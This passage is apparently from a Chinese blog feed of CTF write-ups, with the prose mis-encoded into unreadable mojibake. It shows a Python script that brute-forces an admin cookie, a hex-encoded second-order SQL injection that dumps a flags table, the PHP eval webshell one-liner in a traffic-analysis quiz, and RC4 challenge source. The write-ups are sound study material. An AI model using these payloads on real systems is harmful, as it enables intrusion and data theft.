class="line"></span><br><span class="line">u = requests.session()</span><br><span class="line">charlist = <span class="string">&quot;wh&quot;</span></span><br><span class="line">length = <span class="number">6</span></span><br><span class="line">half_uid = <span class="string">&quot;admin%7C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> one <span class="keyword">in</span> charlist:</span><br><span class="line">    <span class="keyword">for</span> two <span class="keyword">in</span> charlist:</span><br><span class="line">        <span class="keyword">for</span> thr <span class="keyword">in</span> charlist:</span><br><span class="line">            <span class="keyword">for</span> fou <span class="keyword">in</span> charlist:</span><br><span class="line">                <span class="keyword">for</span> fif <span class="keyword">in</span> charlist:</span><br><span class="line">                    <span class="keyword">for</span> six <span class="keyword">in</span> charlist:</span><br><span class="line">                        uid = half_uid + md5(one+two+thr+fou+fif+six+<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">                        cookies = &#123;<span class="string">&quot;uid&quot;</span> : uid&#125;</span><br><span class="line">                        r = u.get(<span class="string">&#x27;http://106.39.10.134:10002/index.php?action=admin&amp;mode=index&#x27;</span>, cookies = cookies)</span><br><span class="line">                        r.encoding = r.apparent_encoding</span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&quot;not login&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                            <span class="built_in">print</span>(r.text)</span><br><span class="line">                            <span class="built_in">print</span>(r.request.headers[<span class="string">&quot;Cookie&quot;</span>])</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;not login:&quot;</span>+one+two+thr+fou+fif+six)</span><br></pre></td></tr></table></figure><p>ç„¶åç™»å½•åˆ°adminé¡µé¢,å‘ç°ä¸€ä¸ªé¡µé¢ä¿®æ”¹çš„åœ°æ–¹,è¯»æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&quot;DIR_PERMITION&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Permision denied!&quot;</span>);</span><br><span class="line"><span class="variable">$userid</span>=<span class="title function_ invoke__">check_login</span>();</span><br><span class="line"><span class="variable">$level</span>=<span class="title function_ invoke__">get_level</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$userid</span>!==<span class="literal">false</span>&amp;&amp;<span class="variable">$level</span>!==<span class="literal">false</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;page&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;TOKEN&#x27;</span>]))&#123;</span><br><span class="line">          <span class="variable">$page</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">          <span class="variable">$TOKEN</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;TOKEN&#x27;</span>];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$TOKEN</span>!=<span class="variable">$_SESSION</span>[<span class="string">&#x27;CSRF_TOKEN&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;token error!&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$page</span>))&#123;</span><br><span class="line">              <span class="keyword">die</span>(<span class="string">&quot;page must be a number!&quot;</span>);   </span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$page</span>&lt;<span class="number">1</span>) <span class="variable">$page</span>=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="variable">$sql</span>=<span class="string">&quot;update page set num=<span class="subst">$page</span>&quot;</span>;</span><br><span class="line">          <span class="variable">$res</span>=<span class="title function_ invoke__">mysql_my_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;update  success!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;location.href=&#x27;./index.php?action=admin&amp;mode=index&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;update  fail!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">               <span class="keyword">die</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;not login!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;location.href=&#x27;./index.php?action=admin&amp;mode=login&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">    <span class="comment">// $result=mysql_my_query($sql);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°isnumericè¿‡æ»¤äº†ä¸€ä¸‹,hexç»•è¿‡ ç„¶ååœ¨index.phpå‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$page_size</span>=<span class="title function_ invoke__">get_page_size</span>();</span><br><span class="line"><span class="comment">//é»˜è®¤ä»…ä»…æ˜¾ç¤º å‰$page_sizeæ¡æ•°æ® </span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from note  limit 0,&quot;</span>.<span class="variable">$page_size</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_my_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>å»common.phpä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_page_size</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$sql</span>=<span class="string">&quot;select num from page&quot;</span>;</span><br><span class="line">      <span class="variable">$res</span>=<span class="title function_ invoke__">mysql_my_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="variable">$row</span>=<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$row</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_page_size</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;update page set num=20&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">mysql_my_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±å¯ä»¥çœ‹åˆ°æ˜¯ä¸ªäºŒæ¬¡æ³¨å…¥,ä½†å‰æå¿…é¡»æ˜¯æ•°æ®åº“pageè¡¨çš„numåˆ—å¿…é¡»æ˜¯varchar,é¢˜ç›®çš„hinté‡Œé¢ç»™å‡ºäº†dbinit.sqlæ–‡ä»¶,æŸ¥çœ‹å‘ç°å®šä¹‰çš„pageå°±æ˜¯varchar,é‚£ä¹ˆåé¢çš„å°±ç®€å•äº†,æˆ‘ä»¬å»æ„é€ sqlçš„è¯­å¥,hexencodeä¸€ä¸‹,ç„¶åå†™åˆ°æ•°æ®åº“,ä¹‹åè®¿é—®indexçš„æ—¶å€™numè¢«æå–å‡ºæ¥,å¹¶ä¸”è¢«æ”¾åˆ°limitåé¢æ‰§è¡Œ. æˆ‘ä»¬æ„é€ ä¸€ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,2,3,4</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æäº¤ä¸€ä¸ª 0x3120756e696f6e2073656c65637420312c322c332c34 å¾—åˆ°ç»“æœ <img src="/images/2018/09/2018-09-05-14-33-50å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç»§ç»­åœ¨2å¤„æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,flag,3,4 from flags</span><br></pre></td></tr></table></figure><p>hexä¸€ä¸‹æˆäº†0x3120756e696f6e2073656c65637420312c666c61672c332c342066726f6d20666c616773 æäº¤ä¸€ä¸‹ <img src="/images/2018/09/2018-09-05-14-35-38å±å¹•æˆªå›¾.png" alt="blacsheep" /></p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å®‰æ’8æœˆæœˆèµ›æµé‡åˆ†æ</title>
      <link href="/2018/08/31/%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2018/08/31/%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="é¦–å…ˆ">é¦–å…ˆ</h2><p>ç®€å•è®°å½•ä¸€ä¸‹ æµé‡åŒ…ä¸‹è½½åœ°å€ï¼š<a href="https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg" title="https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg">https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg</a></p><h2 id="ç¬¬ä¸€é¢˜">ç¬¬ä¸€é¢˜</h2><p><strong>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œç»™å‡ºé»‘å®¢ä½¿ç”¨çš„æ‰«æå™¨</strong> ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯sqlmap,ä¸è¿‡åæ¥å‘ç°æœ‰awvsçš„ç—•è¿¹ <img src="/images/2018/08/2018-08-28-19-56-56å±å¹•æˆªå›¾.png" alt="blacsheep" /> é‚£ä¹ˆæ˜¾ç„¶æ‰«æå™¨å¡«awvs</p><h2 id="ç¬¬äºŒé¢˜">ç¬¬äºŒé¢˜</h2><p><strong>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œå¾—åˆ°é»‘å®¢æ‰«æåˆ°çš„ç™»é™†åå°æ˜¯(ç›¸å¯¹è·¯å¾„å³å¯)</strong> ç›´æ¥è¿‡æ»¤postçš„åŒ… <img src="/images/2018/08/2018-08-28-20-44-06å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="ç¬¬ä¸‰é¢˜">ç¬¬ä¸‰é¢˜</h2><p><strong>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œå¾—åˆ°é»‘å®¢ä½¿ç”¨äº†ä»€ä¹ˆè´¦å·å¯†ç ç™»é™†äº†webåå°(å½¢å¼:username/password)</strong> æŸ¥çœ‹poståˆ°åå°çš„åŒ…,ç„¶åæŸ¥çœ‹åŒæ–¹çš„åŒ…,æˆåŠŸçš„åŒ…ä¼š302,å¦åˆ™æ˜¾ç¤ºé”™è¯¯ æˆåŠŸçš„åŒ… <img src="/images/2018/08/2018-08-28-20-55-22å±å¹•æˆªå›¾.png" alt="blacsheep" /> <img src="/images/2018/08/2018-08-28-20-53-28å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åå¤±è´¥çš„åŒ… <img src="/images/2018/08/2018-08-28-20-57-57å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="ç¬¬å››é¢˜">ç¬¬å››é¢˜</h2><p><strong>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œå¾—åˆ°é»‘å®¢ä¸Šä¼ çš„webshellæ–‡ä»¶åæ˜¯ï¼Œå†…å®¹æ˜¯ä»€ä¹ˆ,æäº¤webshellå†…å®¹çš„baseç¼–ç </strong> èœåˆ€è¿çš„webshellä¸€èˆ¬éƒ½ç»è¿‡äº†base64,æ‰€ä»¥ç›´æ¥è¿‡æ»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;base64_decode&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/2018/08/2018-08-31-14-45-59å±å¹•æˆªå›¾.png" alt="blacsheep" /> å‘ç°äº†shell,æ–‡ä»¶åa.php,å¯†ç 1234 çŒœæµ‹webshellæ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1234]);?&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆåŠŸäº†</p><h2 id="ç¬¬äº”é¢˜">ç¬¬äº”é¢˜</h2><p><strong>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢åœ¨robots.txtä¸­æ‰¾åˆ°çš„flagæ˜¯ä»€ä¹ˆ</strong> ç›´æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;robots.txt&quot;</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/08/2018-08-31-14-55-54å±å¹•æˆªå›¾.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h2 id="ç¬¬å…­é¢˜">ç¬¬å…­é¢˜</h2><p><strong>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢æ‰¾åˆ°çš„æ•°æ®åº“å¯†ç æ˜¯å¤šå°‘</strong> è¿™ä¸ªåœ¨çœ‹a.phpçš„responseçš„æ—¶å€™å‘ç°è¯»äº†config</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;&lt;?php&quot;</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰¾åˆ° <img src="/images/2018/08/2018-08-31-14-59-34å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="ç¬¬ä¸ƒé¢˜">ç¬¬ä¸ƒé¢˜</h2><p><strong>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢åœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°çš„hash_codeæ˜¯ä»€ä¹ˆ</strong> <img src="/images/2018/08/2018-08-31-15-05-31å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="ç¬¬å…«é¢˜">ç¬¬å…«é¢˜</h2><p><strong>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢ç ´è§£äº†è´¦å·ijnu@test.comå¾—åˆ°çš„å¯†ç æ˜¯ä»€ä¹ˆ</strong> <img src="/images/2018/08/2018-08-31-15-07-50å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åè§£ä¸€ä¸‹ <img src="/images/2018/08/2018-08-31-15-10-22å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="ç¬¬ä¹é¢˜">ç¬¬ä¹é¢˜</h2><p><strong>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œè¢«é»‘å®¢æ”»å‡»çš„webæœåŠ¡å™¨ï¼Œç½‘å¡é…ç½®æ˜¯æ˜¯ä»€ä¹ˆï¼Œæäº¤ç½‘å¡å†…ç½‘ip</strong> è¿˜æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;eth0&quot;</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰¾åˆ°äº†a.phpçš„è®°å½• <img src="/images/2018/08/2018-08-31-15-27-11å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="ç¬¬åé¢˜">ç¬¬åé¢˜</h2><p><strong>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢ä½¿ç”¨äº†ä»€ä¹ˆè´¦å·ç™»é™†äº†mailç³»ç»Ÿï¼ˆå½¢å¼: username/passwordï¼‰</strong> åŒç¬¬ä¸‰é¢˜</p><h2 id="ç¬¬åä¸€é¢˜">ç¬¬åä¸€é¢˜</h2><p><strong>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢è·å¾—çš„vpn,ipæ˜¯å¤šå°‘</strong> æŸ¥çœ‹tcpæµ,æäº¤ä¸€ä¸‹ä¸¤ä¸ªæµé‡æœ€å¤šçš„ip å‘ç°ç­”æ¡ˆæ˜¯10.3.4.3</p>]]></content>
      
      
      <categories>
          
          <category> miscç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹webåˆ·é¢˜(æŒç»­æ›´æ–°)</title>
      <link href="/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"/>
      <url>/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="iæ˜¥ç§‹ç¬¬äºŒå±Šæ˜¥ç§‹æ¬¢ä¹èµ›">iæ˜¥ç§‹ç¬¬äºŒå±Šæ˜¥ç§‹æ¬¢ä¹èµ›</h2><h3 id="hello-world">Hello World</h3><p>é¢˜ç›®å†…å®¹:<a href="http://106.75.72.168:9999/" title="http://106.75.72.168:9999/">http://106.75.72.168:9999/</a> è¿›å»ä¹‹ååªæœ‰ä¸€ä¸ªhelloworldçš„é¡µé¢,æ‰«ä¸€ä¸‹ç›®å½•,å‘ç°.git githackä¸€ä¸‹,çœ‹ä¸€ä¸‹log,resetä¸€ä¸‹æ‹¿åˆ°æºç  ä»£ç æ ¼å¼éå¸¸çƒ‚,æ‰¾ä¸ªç¾åŒ–å·¥å…·ç¾åŒ–ä¸€ä¸‹,ä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;Off&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$d</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$e</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">    <span class="variable">$g</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">    <span class="variable">$h</span> = <span class="variable">$e</span> ? (<span class="variable">$k</span> == <span class="string">&#x27;DECODE&#x27;</span> ? <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>, <span class="number">0</span>, <span class="variable">$e</span>) : <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">microtime</span>()) , -<span class="variable">$e</span>)) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$l</span> = <span class="variable">$f</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$f</span> . <span class="variable">$h</span>);</span><br><span class="line">    <span class="variable">$m</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$l</span>);</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%010d&#x27;</span>, <span class="variable">$d</span> ? <span class="variable">$d</span> + <span class="title function_ invoke__">time</span>() : <span class="number">0</span>) . <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span> . <span class="variable">$g</span>) , <span class="number">0</span>, <span class="number">16</span>) . <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$n</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">    <span class="variable">$q</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt;= <span class="number">255</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$q</span>[<span class="variable">$r</span>] = <span class="title function_ invoke__">ord</span>(<span class="variable">$l</span>[<span class="variable">$r</span> % <span class="variable">$m</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$s</span> = <span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt; <span class="number">256</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$s</span> = (<span class="variable">$s</span> + <span class="variable">$p</span>[<span class="variable">$r</span>] + <span class="variable">$q</span>[<span class="variable">$r</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable">$p</span>[<span class="variable">$r</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$r</span>] = <span class="variable">$p</span>[<span class="variable">$s</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$s</span>] = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$u</span> = <span class="variable">$s</span> = <span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt; <span class="variable">$n</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$u</span> = (<span class="variable">$u</span> + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$s</span> = (<span class="variable">$s</span> + <span class="variable">$p</span>[<span class="variable">$u</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable">$p</span>[<span class="variable">$u</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$u</span>] = <span class="variable">$p</span>[<span class="variable">$s</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$s</span>] = <span class="variable">$t</span>;</span><br><span class="line">        <span class="variable">$o</span>.= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$b</span>[<span class="variable">$r</span>]) ^ (<span class="variable">$p</span>[(<span class="variable">$p</span>[<span class="variable">$u</span>] + <span class="variable">$p</span>[<span class="variable">$s</span>]) % <span class="number">256</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$h</span> . <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$o</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="string">&quot;flag_1s_n0t_h3re&quot;</span>;</span><br><span class="line"><span class="variable">$cipher</span> = <span class="string">&quot;3133g8JTV89Ds4oh5k0JRPFijAbc1Qw7HciaZfhsV5lWr+7RM9IAF9SNw9WJMEg&quot;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¯»å®Œå‘ç°æ˜¯ä¸ªrc4çš„åŠ å¯† ç®€è¦åˆ†æä¸€ä¸‹,ä»£ç å°†åŸæ¥çš„å†…å®¹è¿›è¡Œäº†å¤„ç†å¾—åˆ°çš„éƒ¨åˆ†è¿›è¡Œrc4åŠ å¯†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%010d&#x27;</span>, <span class="variable">$d</span> ? <span class="variable">$d</span> + <span class="title function_ invoke__">time</span>() : <span class="number">0</span>) . <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span> . <span class="variable">$g</span>) , <span class="number">0</span>, <span class="number">16</span>) . <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p>è€Œæœ€åå¾—å‡ºçš„ç»“æœæ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable">$h</span> . <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$o</span>));</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå»æ‰<code>$h</code>çš„éƒ¨åˆ†,ç„¶ååŠ ä¸Špaddingå†decodeä¸€ä¸‹å¾—åˆ°åŸæ¥çš„å†…å®¹,ç„¶åå†åŠ å¯†ä¸€æ¬¡å³å¯. æˆ‘è¿™é‡Œç®€å•ç²—æš´,ç›´æ¥æŠŠå†…å®¹æ”¾åœ¨åŠ å¯†éƒ¨åˆ†å‰é¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 